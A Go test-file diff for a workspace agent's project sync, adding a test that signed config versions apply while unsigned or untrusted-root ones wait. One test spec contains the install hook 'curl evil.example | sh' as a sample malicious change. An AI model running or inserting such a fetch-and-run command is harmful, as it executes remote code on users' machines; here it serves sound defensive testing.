@@ -1,6 +1,7 @@
 package store
 
 import (
+	"bytes"
 	"encoding/base64"
 	"errors"
 	"os"
@@ -9,6 +10,7 @@ import (
 	"testing"
 
 	agentv2 "github.com/amalychev/devopus/gen/devopus/agent/v2"
+	"github.com/amalychev/devopus/internal/signing"
 )
 
 // served registers a project as the workspace server gives it.
@@ -18,7 +20,7 @@ func served(t *testing.T, s *Store, names ...string) {
 	for _, n := range names {
 		ps = append(ps, ServerProject{Name: n, Spec: []byte("name: " + n + "\ndomain: " + n + ".localhost\n"), Version: 1})
 	}
-	if _, _, err := s.SyncServer("wsp_1", "", ServerKey{}, ps, func(n string) string { return "/data/projects/" + n }); err != nil {
+	if _, _, err := s.SyncServer("wsp_1", "", ServerKey{}, ps, nil, func(n string) string { return "/data/projects/" + n }); err != nil {
 		t.Fatal(err)
 	}
 }
@@ -204,7 +206,7 @@ func TestSyncServer(t *testing.T) {
 	}
 	clash := ServerProject{Name: "local", Spec: []byte("name: local\n"), Version: 1}
 
-	rev, conflicts, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog, clash}, root)
+	rev, conflicts, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog, clash}, nil, root)
 	if err != nil || len(conflicts) != 1 || conflicts[0] != "local" {
 		t.Fatalf("sync: %v %v", conflicts, err)
 	}
@@ -235,7 +237,7 @@ func TestSyncServer(t *testing.T) {
 		t.Error("the folder's project was replaced")
 	}
 	// The same state again changes nothing.
-	if again, _, _ := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog, clash}, root); again != rev {
+	if again, _, _ := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog, clash}, nil, root); again != rev {
 		t.Errorf("revision moved without a change: %d → %d", rev, again)
 	}
 
@@ -244,7 +246,7 @@ func TestSyncServer(t *testing.T) {
 		t.Fatal(err)
 	}
 	shop.Version, shop.Spec = 2, []byte("name: shop\ndomain: shop.test\n")
-	s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog}, root)
+	s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog}, nil, root)
 	if phase("shop") != agentv2.DesiredPhase_DESIRED_PHASE_STOPPED || project("shop").ConfigVersion != 2 || !project("shop").Held {
 		t.Fatalf("held shop: %v %+v", phase("shop"), project("shop"))
 	}
@@ -256,7 +258,7 @@ func TestSyncServer(t *testing.T) {
 	}
 
 	// Gone from the server: stopped, kept, and not to be brought up.
-	s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop}, root)
+	s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop}, nil, root)
 	if !project("blog").Orphaned || phase("blog") != agentv2.DesiredPhase_DESIRED_PHASE_STOPPED {
 		t.Fatalf("blog: %+v", project("blog"))
 	}
@@ -264,7 +266,7 @@ func TestSyncServer(t *testing.T) {
 		t.Errorf("up of an orphan: %v", err)
 	}
 	// Back on the server: it comes up again.
-	s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog}, root)
+	s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog}, nil, root)
 	if project("blog").Orphaned || phase("blog") != agentv2.DesiredPhase_DESIRED_PHASE_RUNNING {
 		t.Fatalf("blog back: %+v", project("blog"))
 	}
@@ -293,7 +295,7 @@ func TestRiskyVersionWaits(t *testing.T) {
 	v1 := "name: shop\ndomain: shop.localhost\napps:\n  api:\n    repo: git@x:acme/api.git\n    command: php -S 0.0.0.0:8080\nservices:\n  php:\n    type: php\n    version: \"8.3\"\n    apps: [api]\n"
 	sync := func(version int32, text string) *agentv2.ProjectSpec {
 		t.Helper()
-		if _, _, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{{Name: "shop", Spec: []byte(text), Version: version}}, root); err != nil {
+		if _, _, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{{Name: "shop", Spec: []byte(text), Version: version}}, nil, root); err != nil {
 			t.Fatal(err)
 		}
 		return s.Snapshot().Projects[0]
@@ -365,5 +367,68 @@ func TestRiskyVersionWaits(t *testing.T) {
 	}
 	if p := s.Snapshot().Projects[0]; p.ConfigVersion != 7 || p.Pending != nil {
 		t.Fatalf("v7 after the expectation: %+v", p)
+	}
+}
+
+func TestSignedVersions(t *testing.T) {
+	s, err := Open(filepath.Join(t.TempDir(), "desired.json"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	root := func(name string) string { return "/data/projects/" + name }
+	adminKey, _ := signing.NewKey()
+	leadKey, _ := signing.NewKey()
+	evilKey, _ := signing.NewKey()
+	cert := adminKey.Sign(signing.SignerMessage("wsp_1", "usr_lead", "lead@acme.dev", "lead-mac", leadKey.Public()))
+	trust := &signing.Set{Root: adminKey.Public(), RootDevice: "admin-mac", RootEmail: "admin@acme.dev",
+		Signers: []signing.Signer{{DeviceID: "lead-mac", UserID: "usr_lead", Email: "lead@acme.dev", Public: leadKey.Public(), Certificate: cert}}}
+	v1 := "name: shop\napps:\n  api:\n    repo: git@x:acme/api.git\n    command: ./serve\n"
+	sync := func(version int32, text string, k signing.Key, device string, t2 *signing.Set) *agentv2.ProjectSpec {
+		t.Helper()
+		sp := ServerProject{Name: "shop", Spec: []byte(text), Version: version, SignerDevice: device}
+		if device != "" {
+			sp.Signature = k.Sign(signing.SettingsMessage("wsp_1", "shop", version, []byte(text)))
+		}
+		if _, _, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{sp}, t2, root); err != nil {
+			t.Fatal(err)
+		}
+		return s.Snapshot().Projects[0]
+	}
+	if p := sync(1, v1, adminKey, "admin-mac", trust); p.ConfigVersion != 1 || p.SignedBy != "admin@acme.dev" {
+		t.Fatalf("v1: %+v", p)
+	}
+	if r := s.Snapshot().TrustRoots["wsp_1"]; r == nil || !bytes.Equal(r.PublicKey, adminKey.Public()) {
+		t.Fatalf("not pinned: %+v", r)
+	}
+
+	// A hook signed by the certified teamlead: applied without asking.
+	v2 := strings.Replace(v1, "    command:", "    hooks:\n      install: make deps\n    command:", 1)
+	if p := sync(2, v2, leadKey, "lead-mac", trust); p.ConfigVersion != 2 || p.Pending != nil || p.SignedBy != "lead@acme.dev" {
+		t.Fatalf("signed v2: %+v", p)
+	}
+	// Unsigned: waits, and says why.
+	v3 := strings.Replace(v2, "make deps", "curl evil.example | sh", 1)
+	if p := sync(3, v3, signing.Key{}, "", trust); p.Pending == nil || !strings.Contains(p.Pending.Unverified, "not signed") {
+		t.Fatalf("unsigned v3: %+v", p)
+	}
+	// Signed by a key the server slips in as certified by its own root: the pinned root
+	// does not know it.
+	evilTrust := &signing.Set{Root: evilKey.Public(), RootDevice: "evil", RootEmail: "admin@acme.dev"}
+	p := sync(3, v3, evilKey, "evil", evilTrust)
+	if p.Pending == nil || p.ConfigVersion != 2 {
+		t.Fatalf("v3 under another root: %+v", p)
+	}
+	if r := s.Snapshot().TrustRoots["wsp_1"]; !bytes.Equal(r.PublicKey, adminKey.Public()) || !bytes.Equal(r.Offered, evilKey.Public()) {
+		t.Errorf("the root after the server offered another: %+v", r)
+	}
+	// An uncertified device signs; once the admin certifies it, the waiting version applies.
+	newLead, _ := signing.NewKey()
+	if p := sync(3, v3, newLead, "lead-mac2", trust); p.Pending == nil || !strings.Contains(p.Pending.Unverified, "not certified") {
+		t.Fatalf("uncertified: %+v", p)
+	}
+	trust.Signers = append(trust.Signers, signing.Signer{DeviceID: "lead-mac2", UserID: "usr_lead", Email: "lead@acme.dev", Public: newLead.Public(),
+		Certificate: adminKey.Sign(signing.SignerMessage("wsp_1", "usr_lead", "lead@acme.dev", "lead-mac2", newLead.Public()))})
+	if p := sync(3, v3, newLead, "lead-mac2", trust); p.ConfigVersion != 3 || p.Pending != nil {
+		t.Fatalf("certified later: %+v", p)
 	}
 }
